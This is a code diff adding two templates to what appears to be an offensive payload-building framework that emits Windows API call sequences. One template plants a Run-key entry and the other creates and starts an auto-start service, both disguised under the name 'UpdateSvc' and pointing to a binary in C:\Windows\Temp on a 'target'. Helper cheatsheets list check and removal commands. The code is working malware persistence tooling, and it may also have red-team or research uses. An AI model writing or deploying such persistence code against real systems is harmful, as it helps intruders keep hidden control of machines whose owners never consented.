@@ -891,3 +891,266 @@ class IRCheckPathTemplate(WorkflowTemplate):
             ("Exit code 0 if path exists", ""),
             ("Exit code 1 if path missing", ""),
         ]
+
+
+# ---------------------------------------------------------------------------
+# Registry persist workflow
+# ---------------------------------------------------------------------------
+
+_HKEY_CURRENT_USER = 0x80000001
+_KEY_SET_VALUE = 0x0002
+_REG_SZ = 1
+
+_DEFAULT_REG_SUBKEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+_DEFAULT_REG_VALUE = "UpdateSvc"
+_DEFAULT_DST_PATH = r"C:\Windows\Temp\svc.exe"
+
+
+def build_registry_persist_workflow(
+    reg_subkey: str = _DEFAULT_REG_SUBKEY,
+    value_name: str = _DEFAULT_REG_VALUE,
+    dst_path: str = _DEFAULT_DST_PATH,
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    r"""Build the registry_persist reference workflow.
+
+    RegOpenKeyExA(HKCU, subkey, 0, KEY_SET_VALUE, &hKey) ->
+    RegSetValueExA(hKey, value_name, 0, REG_SZ, dst_path, len) ->
+    RegCloseKey(hKey) -> exit
+
+    The phkResult OUT parameter uses AddressOf(AllocateLocal) so the API
+    writes the opened key handle through a pointer. Subsequent calls read
+    it back via NameRef.
+    """
+    dst_len = len(dst_path) + 1  # null terminator
+
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_registry_persist",
+        blocks=(
+            Block("entry", (
+                ConstructString("reg_subkey", reg_subkey),
+                ConstructString("reg_value_name", value_name),
+                ConstructString("dst_path", dst_path),
+                AllocateLocal("reg_handle"),
+
+                CallAPI(
+                    "RegOpenKeyExA",
+                    arguments=(
+                        Immediate(_HKEY_CURRENT_USER),
+                        AddressOf("reg_subkey"),
+                        Immediate(0),          # ulOptions
+                        Immediate(_KEY_SET_VALUE),
+                        AddressOf("reg_handle"),  # phkResult (OUT)
+                    ),
+                    result="regopen_ret",
+                ),
+                Compare(
+                    "regopen_ret",
+                    SuccessPredicate.ZERO,
+                    true_block="set_value",
+                    false_block="fail",
+                ),
+            )),
+
+            Block("set_value", (
+                CallAPI(
+                    "RegSetValueExA",
+                    arguments=(
+                        NameRef("reg_handle"),
+                        AddressOf("reg_value_name"),
+                        Immediate(0),          # Reserved
+                        Immediate(_REG_SZ),
+                        AddressOf("dst_path"),
+                        Immediate(dst_len),
+                    ),
+                    result="regset_ret",
+                ),
+                # Close regardless of set result
+                CallAPI(
+                    "RegCloseKey",
+                    arguments=(NameRef("reg_handle"),),
+                ),
+                Jump("success"),
+            )),
+
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRRegistryPersistTemplate(WorkflowTemplate):
+    """IR-backed registry_persist template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_registry_persist_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_registry_persist_workflow(
+            reg_subkey=_DEFAULT_REG_SUBKEY,
+            value_name=config.service_name or _DEFAULT_REG_VALUE,
+            dst_path=config.dst_path or _DEFAULT_DST_PATH,
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        val = config.service_name or _DEFAULT_REG_VALUE
+        dst = config.dst_path or _DEFAULT_DST_PATH
+        return [
+            ("Registry hive", "HKEY_CURRENT_USER"),
+            ("Run key", _DEFAULT_REG_SUBKEY),
+            ("Value name", val),
+            ("Binary path on target", dst),
+            ("Check value",
+             f'reg query "HKCU\\{_DEFAULT_REG_SUBKEY}" /v {val}'),
+            ("Remove value",
+             f'reg delete "HKCU\\{_DEFAULT_REG_SUBKEY}" /v {val} /f'),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Service persist workflow
+# ---------------------------------------------------------------------------
+
+_SC_MANAGER_CREATE_SERVICE = 0x0002
+_SERVICE_ALL_ACCESS = 0x000F01FF
+_SERVICE_WIN32_OWN_PROCESS = 0x10
+_SERVICE_AUTO_START = 0x02
+_SERVICE_ERROR_IGNORE = 0x00
+
+_DEFAULT_SERVICE_NAME = "UpdateSvc"
+
+
+def build_service_persist_workflow(
+    service_name: str = _DEFAULT_SERVICE_NAME,
+    dst_path: str = _DEFAULT_DST_PATH,
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the service_persist reference workflow.
+
+    OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE) ->
+    CreateServiceA(hSCM, name, display, SERVICE_ALL_ACCESS,
+                   SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
+                   SERVICE_ERROR_IGNORE, path, NULL x5) ->
+    StartServiceA(hSvc, 0, NULL) ->
+    CloseServiceHandle(hSvc) -> CloseServiceHandle(hSCM) -> exit
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_service_persist",
+        blocks=(
+            Block("entry", (
+                ConstructString("service_name", service_name),
+                ConstructString("dst_path", dst_path),
+
+                CallAPI(
+                    "OpenSCManagerA",
+                    arguments=(
+                        Immediate(0),    # lpMachineName = NULL
+                        Immediate(0),    # lpDatabaseName = NULL
+                        Immediate(_SC_MANAGER_CREATE_SERVICE),
+                    ),
+                    result="scm_handle",
+                ),
+                Compare(
+                    "scm_handle",
+                    SuccessPredicate.NONZERO,
+                    true_block="create_service",
+                    false_block="fail",
+                ),
+            )),
+
+            Block("create_service", (
+                CallAPI(
+                    "CreateServiceA",
+                    arguments=(
+                        NameRef("scm_handle"),
+                        AddressOf("service_name"),     # lpServiceName
+                        AddressOf("service_name"),     # lpDisplayName (same)
+                        Immediate(_SERVICE_ALL_ACCESS),
+                        Immediate(_SERVICE_WIN32_OWN_PROCESS),
+                        Immediate(_SERVICE_AUTO_START),
+                        Immediate(_SERVICE_ERROR_IGNORE),
+                        AddressOf("dst_path"),         # lpBinaryPathName
+                        Immediate(0),    # lpLoadOrderGroup = NULL
+                        Immediate(0),    # lpdwTagId = NULL
+                        Immediate(0),    # lpDependencies = NULL
+                        Immediate(0),    # lpServiceStartName = NULL
+                        Immediate(0),    # lpPassword = NULL
+                    ),
+                    result="svc_handle",
+                ),
+                Compare(
+                    "svc_handle",
+                    SuccessPredicate.NONZERO,
+                    true_block="start_service",
+                    false_block="close_scm_fail",
+                ),
+            )),
+
+            Block("start_service", (
+                CallAPI(
+                    "StartServiceA",
+                    arguments=(
+                        NameRef("svc_handle"),
+                        Immediate(0),    # dwNumServiceArgs = 0
+                        Immediate(0),    # lpServiceArgVectors = NULL
+                    ),
+                ),
+                # Close service handle
+                CallAPI(
+                    "CloseServiceHandle",
+                    arguments=(NameRef("svc_handle"),),
+                ),
+                Jump("close_scm_ok"),
+            )),
+
+            Block("close_scm_ok", (
+                CallAPI(
+                    "CloseServiceHandle",
+                    arguments=(NameRef("scm_handle"),),
+                ),
+                Jump("success"),
+            )),
+
+            Block("close_scm_fail", (
+                CallAPI(
+                    "CloseServiceHandle",
+                    arguments=(NameRef("scm_handle"),),
+                ),
+                Jump("fail"),
+            )),
+
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRServicePersistTemplate(WorkflowTemplate):
+    """IR-backed service_persist template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_service_persist_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_service_persist_workflow(
+            service_name=config.service_name or _DEFAULT_SERVICE_NAME,
+            dst_path=config.dst_path or _DEFAULT_DST_PATH,
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        svc = config.service_name or _DEFAULT_SERVICE_NAME
+        dst = config.dst_path or _DEFAULT_DST_PATH
+        return [
+            ("Service name", svc),
+            ("Binary path on target", dst),
+            ("Check status", f"sc query {svc}"),
+            ("Remove service", f"sc delete {svc}"),
+        ]
